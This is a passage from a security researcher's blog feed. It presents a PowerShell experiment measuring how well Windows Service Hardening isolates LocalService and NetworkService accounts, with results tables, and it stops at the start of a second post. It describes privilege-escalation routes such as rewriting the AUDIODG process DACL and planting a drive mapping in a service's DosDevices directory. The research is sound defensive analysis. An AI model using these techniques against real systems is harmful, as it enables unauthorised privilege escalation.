Objects. These resources might not directly lead to compromise but it does give us a general idea of the maximum impact.&nbsp;</div><div><br /></div><div>It's worth noting that the hypothesis made a point to specify writing to the resources of a service which has impersonate privilege from one which does not. However this experimental process will only base the analysis on whether the resource is owned by the service user. This is intentional, it'd be too complex to attribute the resource to a specific service in all cases. However an assumption is made that more services running as a specific user have impersonate privilege than do not, therefore in all probability any resource you can write to is probably owned by one of them. We could verify that assumption if we liked, but I'll probably not.</div><div><br /></div><div>Finally, a good experiment should be something which can be repeatable and verifiable. To that end I'll provide all the code necessary to perform the steps, written in PowerShell and using my <i>NtObjectManager</i> module. If you want to re-run the experiment you should be able to do so and produce a very similar set of results.</div></div><br /><h3>Experiment Procedure Detail</h3>On to specific PowerShell steps to perform the experiment. First off you'll need my <a href=\"https://www.powershellgallery.com/packages/NtObjectManager\">NtObjectManager</a> module, specifically at least version 1.1.25 as I've added a few extra commands to simplify the process. You will also need to run all the commands as the SYSTEM user, some command will need it (such as getting access tokens) others benefit for the elevated privileges. From an admin command prompt you can create a SYSTEM PowerShell console using the following command:<br /><br /><span>Start-Win32ChildProcess -RequiredPrivilege SeTcbPrivilege,SeBackupPrivilege,SeRestorePrivilege,SeDebugPrivilege powershell</span><br /><br />This command will find a SYSTEM process to create the new process from which also has, at a minimum, the specified list of privileges. Due to the way the process is created it'll also have full access to the current desktop so you can spawn GUI applications running at system if you need them.<br /><br />The experiment will be run on a VM of Windows 1909 Enterprise updated to December 2019 from a split-token admin user account. This just ensures the minimum amount of configuration changes and additional software is present. Of course there's going to be variability on the number of services running at any one time, there's not a lot which can be done about that. However it's expected that the result should be same even if the individual resources available are not. If you were concerned you could rerun the experiment on multiple different installs of Windows at different times of day and aggregate the results.<br /><br /><h4>Creating the Access Tokens</h4><div>We need to create 5 access tokens for the test. Ideally we'd like to create the four service tokens using the exact method used by the SCM. We could register our unknown service and start the service to steal its token. There is also an undocumented&nbsp;<i>RGetServiceProcessToken</i> SCM RPC method in newer versions of Windows 10. However I think creating a service risks some resources being populated with that service's identity which might not be what we really want. Instead we can use <a href=\"https://docs.microsoft.com/en-us/windows/win32/secauthn/logonuserexexw\">LogonUserExExW</a>&nbsp;which is what the SCM uses, with the&nbsp;LOGON32_LOGON_SERVICE type to create LS and NS tokens. This will work as long as we have <i>SeTcbPrivilege</i>. We'll then just add the appropriate groups, convert to WR,&nbsp; and remove privileges as necessary. We can get to the <i>LogonUserExExW</i>&nbsp;API using <i>Get-NtToken. </i>I've wrapped up everything into a function <i>Get-ServiceToken</i>, you can see the full function in the <a href=\"https://gist.github.com/tyranid/1431ec4da18c89cdea34cfe3f3af2bc0#file-wsh_experiment-ps1-L6\">final script</a>. Using this function we can create all the tokens we need using the following commands:</div><div><br /><span>$tokens = @()</span><br /><span>$tokens += Get-ServiceToken LocalService FakeService</span><br /><span>$tokens += Get-ServiceToken LocalService&nbsp;FakeService -WriteRestricted</span><br /><span>$tokens += Get-ServiceToken NetworkService FakeService</span><br /><span>$tokens += Get-ServiceToken NetworkService FakeService -WriteRestricted</span><br /><br />For the control token we'll get the unmodified session access token for the current desktop. Even though we're running as SYSTEM as we're running on the same desktop we can just use the following command:</div><div><br /></div><div><span>$tokens += Get-NtToken -Session -Duplicate</span></div><div><br /><i>Random note. </i>When calling <i>LogonUserExExW</i> and requesting a service SID as an additional group the call will fail with access denied. However this only happens if the service SID is the first NT Authority SID in the additional groups list. Putting any other NT Authority SID, including our new logon session SID before the service SID makes it work. Looking at the code in LSASRV (possibly the function <i>LsapCheckVirtualAccountRestriction</i>) it looks like the use of a service SID should be restricted to the first process (based on its PID) that used a service SID which would be the SCM. However if another NT Authority SID is placed first the checking loop sets a boolean flag which prevents the loop checking any more SIDs and so the service SID is ignored. I've no idea if this is a bug or not, however as you need TCB privilege to set the additional groups I don't think it's a security issue.<br /><br /><h4>Resource Checking and Result Collation</h4></div><div>With the 5 tokens in hand we can progress to assessing accessible resources. The original purpose of my Sandbox Analysis tools was finding accessible resources from a sandbox process, however the same code is capable of finding resources accessible from any access token, including service tokens.</div><div><br /></div><div>First as way of example lets run checks for process and threads:</div><div><br /></div><div><div><span>$ps = Get-AccessibleProcess -Tokens $tokens `</span></div><div><span>&nbsp; &nbsp; -CheckMode ProcessOnly -AllowEmptyAccess</span></div><div><span>$ts = Get-AccessibleProcess -Tokens $tokens `</span></div><div><span>&nbsp; &nbsp; -CheckMode ThreadOnly -AllowEmptyAccess</span></div></div><div><br /></div><div>We can pass a list of tokens to the checking command, this improves performance as we only do the enumeration of resources for every token group then do the access check. Each generated access result has a <i>TokenId</i> property which indicates the unique ID of the token which was used for the check, this allows us to extract the correct results later. We also specify the <i>AllowEmptyAccess</i> option, which will generate a result even if the access check fails and the token has no access to the resource. This will be useful to allow us to assess what resources are owned by the token's owner SID but we were not granted access.</div><div><br /></div><div>Let's do the rest of the resources:</div><div><br /></div><div><div><span>$os = Get-AccessibleObject \\ -Recurse `</span></div><div><span>&nbsp; &nbsp; -Tokens $tokens -AllowEmptyAccess</span></div></div><div><div><span>$fs = Get-AccessibleFile -Win32Path \"$env:SystemDrive\\\" `</span></div><div><span>&nbsp; &nbsp; -FormatWin32Path -</span><span>Recurse -Tokens $tokens -AllowEmptyAccess</span></div><div><span>$ks = Get-AccessibleKey \\Registry -FormatWin32Path -Recurse `</span></div><div><span>&nbsp; &nbsp; -Tokens $tokens -AllowEmptyAccess</span></div></div><div><br /></div><div>We'll only get the accessible files on the system drive in this case as that'll be the only drive in the VM. Note that <i>Get-AccessibleObject</i> doesn't check ALPC ports, it's not possible to open an ALPC port by name and read its security descriptor. We'll ignore ALPC ports for this experiment, as it's probably worthy of a topic all on its own.</div><div><br /></div><div>We now have all the results we need in five variables along with the tokens. If you want to run it yourself the final script is on Github <a href=\"https://gist.github.com/tyranid/1431ec4da18c89cdea34cfe3f3af2bc0\">here</a>. It'll take a fair amount of time to run but once it's complete you'll find 5 CSV files in the current directory containing the results for each token.<br /><br /></div><h3>Experiment Results</h3>We now need to do our basic analysis of the results. Let's start with calculating the percentage of writable resources for each token type relative to the total number of resources. From my single experiment run I got the following table:<br /><br /><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" dir=\"ltr\" style=\"border-collapse: collapse; border: none; font-family: Arial; font-size: 10pt; width: 0px;\"><colgroup><col width=\"100\" /><col width=\"100\" /><col width=\"100\" /><col width=\"100\" /></colgroup><tbody><tr style=\"height: 21px;\"><td style=\"background-color: white; border: 1px solid rgb(0, 0, 0); overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Token</td><td style=\"background-color: #d9d9d9; border-color: rgb(0, 0, 0) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Writable</td><td style=\"background-color: #d9d9d9; border-color: rgb(0, 0, 0) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Writable (WR)</td><td style=\"background-color: #d9d9d9; border-color: rgb(0, 0, 0) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Total</td></tr><tr style=\"height: 21px;\"><td style=\"background-color: #d9d9d9; border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Control</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">99.83%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">N/A</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">13171</td></tr><tr style=\"height: 21px;\"><td style=\"background-color: #d9d9d9; border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Network Service</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">65.00%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.00%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">300</td></tr><tr style=\"height: 21px;\"><td style=\"background-color: #d9d9d9; border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Local Service</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">62.89%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.70%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">574</td></tr></tbody></table><br />As we expected the control token had almost 100% of the owned resources writable by the user.&nbsp; However for the two service accounts both had over 60% of their owned resources writable when using an unrestricted token. That level is almost completely eliminated when using a WR token, there were no writable resources for NS and only 4 resources writable from LS, which was less than 1%. Those 4 resources were just Events, from a service perspective not very exciting though there were ACL'ed to everyone which is unusual.<br /><br />Just based on these numbers alone it would seem that WSH really is a failure when used unrestricted but is probably fine when used in WR mode. It'd be interesting to dig into what types are writable in the unrestricted mode to get a better understanding of where WSH is failing. This is what I've summarized in the following table:<br /><br /><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" dir=\"ltr\" style=\"border-collapse: collapse; border: none; font-family: Arial; font-size: 10pt; width: 0px;\"><colgroup><col width=\"100\" /><col width=\"100\" /><col width=\"100\" /><col width=\"100\" /><col width=\"100\" /></colgroup><tbody><tr style=\"height: 21px;\"><td style=\"background-color: white; border: 1px solid rgb(0, 0, 0); overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Type</td><td style=\"background-color: #d9d9d9; border-color: rgb(0, 0, 0) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">LS Writable%</td><td style=\"background-color: #d9d9d9; border-color: rgb(0, 0, 0) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">LS Writable</td><td style=\"background-color: #d9d9d9; border-color: rgb(0, 0, 0) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">NS Writable%</td><td style=\"background-color: #d9d9d9; border-color: rgb(0, 0, 0) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">NS Writable</td></tr><tr style=\"height: 21px;\"><td style=\"background-color: #d9d9d9; border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Directory</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.28%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">1</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.51%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">1</td></tr><tr style=\"height: 21px;\"><td style=\"background-color: #d9d9d9; border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Event</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">1.66%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">6</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.51%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">1</td></tr><tr style=\"height: 21px;\"><td style=\"background-color: #d9d9d9; border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">File</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">74.24%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">268</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">48.72%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">95</td></tr><tr style=\"height: 21px;\"><td style=\"background-color: #d9d9d9; border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Key</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">22.44%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">81</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">49.23%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">96</td></tr><tr style=\"height: 21px;\"><td style=\"background-color: #d9d9d9; border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Mutant</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.28%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">1</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.51%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">1</td></tr><tr style=\"height: 21px;\"><td style=\"background-color: #d9d9d9; border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Process</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.28%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">1</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.00%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0</td></tr><tr style=\"height: 21px;\"><td style=\"background-color: #d9d9d9; border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Section</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.55%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">2</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.00%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0</td></tr><tr style=\"height: 21px;\"><td style=\"background-color: #d9d9d9; border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">SymbolicLink</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.28%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">1</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.51%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">1</td></tr><tr style=\"height: 21px;\"><td style=\"background-color: #d9d9d9; border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Thread</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.00%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.00%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0</td></tr></tbody></table><br />The clear winners, if there is such a thing is Files and Registry Keys taking up over 95% of the resources which are writable. Based on what we know about how WSH works this is understandable. The likelihood is any keys/files are getting their security through inheritance from the parent container. This will typically result in at least the owner field being the service account granted WRITE_DAC access, or the inherited DACL will contain an OWNER CREATOR SID which results an explicit access for the service account.<br /><br />What is perhaps more interesting is the results for Processes and Threads, neither NS or LS have any writable threads and only LS has a single writable process. This primary reason for the lack of writable threads and processes is due to the default DACL which is used for new processes when an explicit DACL isn't specified. The DACL has a OWNER RIGHTS SID granted only READ_CONTROL access, the result is that even if the owner of the resource is the service account it isn't possible to write to it. The only way to get full access as per the default DACL is by having the specific service SID in your group list.<br /><br />Why does LS have one writable process? This I think is probably a \"bug\" in the Audio Service which creates the AUDIODG process. If we look at the security descriptor of the AUDIODG process we see the following:<br /><br /><span>&lt;Owner&gt;</span><br /><span>&nbsp;- Name&nbsp; : NT AUTHORITY\\LOCAL SERVICE</span><br /><span><br /></span><span>&lt;</span><span>DACL</span><span>&gt;</span><br /><span>&nbsp;- Type&nbsp; : Allowed</span><br /><span>&nbsp;- Name&nbsp; : NT SERVICE\\Audiosrv</span><br /><span>&nbsp;- Access: Full Access</span><br /><span><br /></span><span>&nbsp;- Type&nbsp; : Allowed</span><br /><span>&nbsp;- Name&nbsp; : NT AUTHORITY\\Authenticated Users</span><br /><span>&nbsp;- Access: QueryLimitedInformation</span><br /><br />The owner is LS which will grant WRITE_DAC access to the resource if nothing else is in the DACL to stop it. However the default DACL's OWNER RIGHTS SID is missing from the DACL, which means this was probably set explicitly by the Audio Service to grant <i>Authenticated Users</i> query access. This results in the access not being correctly restricted from other service accounts. Of course AUDIODG has <i>SeImpersonatePrivilege</i> so if you find yourself inside a LS unrestricted process with no impersonate privilege you can open AUDIODG (if running) for WRITE_DAC, change the DACL to grant full access and get back impersonate privileges.<br /><br />If you look at the results one other odd thing you'll notice is that while there are readable threads there are no readable processes, what's going on? If we look at a normal LS service process' security descriptor we see the following:<br /><br /><span>&lt;</span><span>Owner&gt;</span><br /><span>&nbsp;- Name&nbsp; : NT AUTHORITY\\LogonSessionId_0_202349</span><br /><span><br /></span><span>&lt;</span><span>DACL</span><span>&gt;</span><br /><span>&nbsp;- Type&nbsp; : Allowed</span><br /><span>&nbsp;- Name&nbsp; : NT AUTHORITY\\LogonSessionId_0_202349</span><br /><span>&nbsp;- Access: Full Access</span><br /><span><br /></span><span>&nbsp;- Type&nbsp; : Allowed</span><br /><span>&nbsp;- Name&nbsp; : BUILTIN\\Administrators</span><br /><span>&nbsp;- Access: QueryInformation|QueryLimitedInformation</span><br /><br />We should be able to see the reason, the owner is not LS, but instead the logon session SID which is unique per-service. This blocks other LS processes from having any access rights by default. Then the DACL only grants full access to the logon session SID, even administrators are apparently not the be trusted (though they can typically just bypass this using <i>SeDebugPrivilege</i>). This security descriptor is almost certainly set explicitly by the SCM when creating the process.<br /><br />Is there anything else interesting in writable resources outside of the files and keys? The one interesting result shared between NS and LS is a single writable Object Directory. We can take a look at the results to find out what directories these are, to see if they share any common purpose. The directory paths are&nbsp;<i>\\Sessions\\0\\DosDevices\\00000000-000003e4</i> for NS and&nbsp;<i>\\Sessions\\0\\DosDevices\\00000000-000003e5</i> for LS. These are the service account's DOS Device directory, the default location to start looking up drive mappings. As the accounts can write to their respective directory this gives another angle of attack, you can compromise any service process running as the same used by dropping a mapping for the C: drive and waiting the process to load a DLL. Leaving that angle open seems sloppy, but it's not like there are no alternative routes to compromise another service.<br /><br />I think that's the limit of my interest in analysis. I've put my results up on Google Drive <a href=\"https://docs.google.com/spreadsheets/d/1nCozmBZC1b_AwXYd8wLgMexv8MHcw0xwFAsnoSURdi4/edit?usp=sharing\">here</a> if you want to play around yourself.<br /><br /><h3>Conclusions</h3>Even though I've not run the experiment on multiple machines, at different times with different software I think I can conclude that WSH does not provide any meaningful security boundary when used in its default unrestricted mode. Based on the original hypothesis we can clearly write to resources not created by a service and therefore could likely fully compromise the system. The implementation does do a good job of securing process and thread resources which provide trivial elevation routes but that can be easily compromised if there's appropriate processes running (including some COM services). I can fully support this not being something MS would want to defend through issuing bulletins.<br /><br />However when used in WR mode WSH is much more comprehensive. I'd argue that as long as a service doesn't have impersonate privilege then it's effectively sandboxed if running in with a WR token. MS already support sandbox escapes as a defended boundary so I'm not sure why WR sandboxes shouldn't also be included as part of that. For example if the trick using the Task Scheduler worked from a WR service I'd see that as circumventing a security boundary, however I don't work in MSRC so I have no influence on what is or is not fixed.<br /><br />Of course in an ideal world you wouldn't use shared accounts at all. Versions of Windows since 7 have support for <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd548356(v=ws.10)\">Virtual Service Accounts</a> where the service user is the service SID rather than a standard service account and the SCM even limits the service's IL to High rather than System. Of course by default these accounts still have impersonate privilege, however you could also remove that.<br /><br />", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/1545060922524989337"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/1545060922524989337"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2020/01/empirically-assessing-windows-service.html", "title": "Empirically Assessing Windows Service Hardening"}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}}, {"id": "tag:blogger.com,1999:blog-4304739697716191998.post-8882751517907619498", "guidislink": true, "link": "https://www.tiraniddo.dev/2019/12/the-mysterious-case-of-broken-virus.html", "published": "2019-12-05T19:08:00.001-08:00", "published_parsed": [2019, 12, 6, 3, 8, 0, 4, 340, 0], "updated": "2019-12-06T11:11:10.200-08:00", "updated_parsed": [2019, 12, 6, 19, 11, 10, 4, 340, 0], "tags": [{"term": "AppLocker", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Strange Behaviour", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Windows", "scheme": "http://www.blogger.com/atom/ns#", "label": null}], "title": "The Mysterious Case of a Broken Virus Scanner", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "The Mysterious Case of a Broken Virus Scanner"}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "On my VM (with a default Windows 10 1909) I used for my series of AppLocker I wanted to test out the new Edge.&nbsp; I opened the old Edge and tried to download the canary installer, however the download failed, Edge said the installer had a virus and it'd been deleted. How rude! I also tried the download in Chrome on the same machine with the same result, even ruder!<br /><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://1.bp.blogspot.com/-NaY3DF2Xdbg/Xem6WjDKPUI/AAAAAAAAECY/LXcgxoJQ_x0DoSRLe0ay5gstw6-UWymIwCLcBGAsYHQ/s1600/applocker_error_2.PNG\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"Downloading Edge Canary in Edge with AppLocker. Shows a bar that the download has been deleted because it's a virus.\" border=\"0\" height=\"276\" 